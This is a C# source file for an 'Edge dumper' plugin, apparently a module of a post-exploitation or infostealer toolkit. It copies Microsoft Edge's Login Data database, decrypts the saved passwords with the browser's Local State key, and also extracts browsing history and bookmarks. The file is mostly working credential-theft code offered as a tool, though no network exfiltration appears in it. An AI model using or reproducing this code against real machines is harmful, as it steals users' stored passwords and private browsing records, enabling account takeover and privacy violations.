using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data;
using System.IO;
using Plugin.Abstractions48;
using System.Text.RegularExpressions;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using static Plugin48Dumper.clsChromeDumper;
using System.Security.Cryptography;

namespace Plugin48Dumper
{
    internal class clsEdgeDumper : clsDumper
    {
        private string EdgeDir { get { return Path.Combine(ApplicationData, "Microsoft", "Edge"); } }
        private string UserDataFile { get { return Path.Combine(EdgeDir, "User Data"); } }
        private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }
        private string LocalStateFile { get { return Path.Combine(UserDataFile, "Local State"); } }
        private string LoginFile { get { return Path.Combine(DefaultDir, "Login Data"); } }

        private string BookMarkFile { get { return Path.Combine(DefaultDir, "Bookmarks"); } }
        private string HistoryFile { get { return Path.Combine(DefaultDir, "History"); } }
        private string WebDataFile { get { return Path.Combine(DefaultDir, "Web Data"); } }

        public DataTable dtHelp = new DataTable();

        public clsEdgeDumper()
        {
            Description = "Edge dumper.";
            Usage = "foo";
            Entry = "edge";

            dtHelp.Columns.Add("Action");
            dtHelp.Columns.Add("Description");

            dtHelp.Rows.Add("help", "Show help.");
            dtHelp.Rows.Add("cred", "Dump credentials.");
            dtHelp.Rows.Add("history", "Dump browser history records.");
            dtHelp.Rows.Add("download", "Dump downloaded files.");
            dtHelp.Rows.Add("bookmark", "Dump browser bookmarks.");

            Available = File.Exists(LoginFile);
        }

        public class clsCredential
        {
            public bool Decrypted;

            public string URL;
            public string Username;
            public string Password;
            public string szCreationDate;
            public string szLastUsed;
        }

        public class clsCookie
        {
            public string szHost { get; set; }
            public string szName { get; set; }
            public string szValue { get; set; }
        }

        public class clsHistory
        {
            public string Title;
            public string URL;
            public string szLastUsed;
        }

        public class clsDownload
        {
            public string FileName;
            public string TargetPath;
            public string URL;
            public long Length;
            public string szDate;
        }

        public class clsBookmark
        {
            public string Name;
            public string URL;
            public string Path;

            public string szAddDate;
            public string szLastUsed;
        }

        public override void fnRun(List<string> lsArgs)
        {

        }

        public List<clsCredential> fnDumpCredential(int nCount = 100, string szRegex = "")
        {
            List<clsCredential> ls = new List<clsCredential>();

            string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            File.Copy(LoginFile, dst);

            var handler = new clsSQLiteHandler(dst);
            if (!handler.ReadTable("logins"))
                return ls;

            int nRowCount = handler.GetRowCount();
            clsTools.fnLogInfo($"Total records: {nRowCount}");

            var decryptor = new ChromiumDecryptor(LocalStateFile);

            for (int i = 0; i < nCount; i++)
            {
                var origin_url = handler.GetValue(i, "origin_url");
                var username_value = handler.GetValue(i, "username_value");
                var password_value = "[FAILED]";
                var date_created = handler.GetValue(i, "date_created");
                var date_last_used = handler.GetValue(i, "date_last_used");

                try
                {
                    date_created = fnChromeTimeToDateTime(long.Parse(date_created))?.ToString("F");
                    date_last_used = fnChromeTimeToDateTime(long.Parse(date_last_used))?.ToString("F");
                }
                catch (Exception ex)
                {
                    clsTools.fnLogError(ex.Message);
                }

                bool bDecrypted = false;

                try
                {
                    password_value = decryptor.Decrypt(handler.GetValue(i, "password_value"));
                    bDecrypted = true;
                }
                catch (Exception ex)
                {

                }

                if (!string.IsNullOrEmpty(origin_url) && (Regex.IsMatch(origin_url, szRegex) || Regex.IsMatch(username_value, szRegex)))
                {
                    ls.Add(new clsCredential
                    {
                        Decrypted = bDecrypted,

                        URL = origin_url,
                        Username = username_value,
                        Password = password_value,
                        szCreationDate = date_created,
                        szLastUsed = date_last_used,
                    });
                }
            }

            File.Delete(dst);

            return ls;
        }

        public List<clsHistory> fnDumpHistory(int nCount = 100, string szRegex = "")
        {
            List<clsHistory> ls = new List<clsHistory>();

            string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            File.Copy(HistoryFile, dst, true);

            var handler = new clsSQLiteHandler(dst);
            if (!handler.ReadTable("urls"))
                return ls;

            int nRowCount = handler.GetRowCount();
            clsTools.fnLogInfo($"Total records: {nRowCount}");

            for (int i = 0; i < nCount; i++)
            {
                var url = handler.GetValue(i, "url");
                var title = handler.GetValue(i, "title");
                var last_visit_time = handler.GetValue(i, "last_visit_time");

                if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(title) &&
                    (Regex.IsMatch(url, szRegex) || Regex.IsMatch(title, szRegex))
                )
                {
                    ls.Add(new clsHistory
                    {
                        URL = url,
                        Title = title,
                        szLastUsed = fnChromeTimeToDateTime(long.Parse(last_visit_time))?.ToString("F"),
                    });
                }
            }

            File.Delete(dst);

            return ls;
        }

        public List<clsBookmark> fnDumpBookmark(int nCount = 100)
        {
            List<clsBookmark> ls = new List<clsBookmark>();

            string szContent = File.ReadAllText(BookMarkFile);

            var root = JObject.Parse(szContent);
            var roots = root["roots"];
            if (roots == null)
                return ls;

            foreach (var r in roots.Children<JProperty>())
            {
                var node = r.Value;
                fnParseNode(node, r.Name, ls, nCount);
            }

            return ls;
        }

        private void fnParseNode(JToken node, string szCurrentPath, List<clsBookmark> output, int nMaximum)
        {
            var type = node["type"]?.ToString();

            if (nMaximum != -1 && output.Count >= nMaximum)
                return;

            if (type == "url")
            {
                output.Add(new clsBookmark()
                {
                    Name = node["name"]?.ToString(),
                    URL = node["url"]?.ToString(),
                    Path = szCurrentPath,

                    szAddDate = fnChromeTimeToDateTime(long.Parse(node["date_added"]?.ToString()))?.ToString("F"),
                    szLastUsed = fnChromeTimeToDateTime(long.Parse(node["date_last_used"]?.ToString()))?.ToString("F"),
                });

                return;
            }

            var children = node["children"];
            if (children == null)
                return;

            foreach (var child in children)
            {

                var name = child["name"]?.ToString();
                var nextPath = string.IsNullOrEmpty(name) ? szCurrentPath : $"{szCurrentPath}/{name}";

                fnParseNode(child, nextPath, output, nMaximum);
            }
        }
    }
}
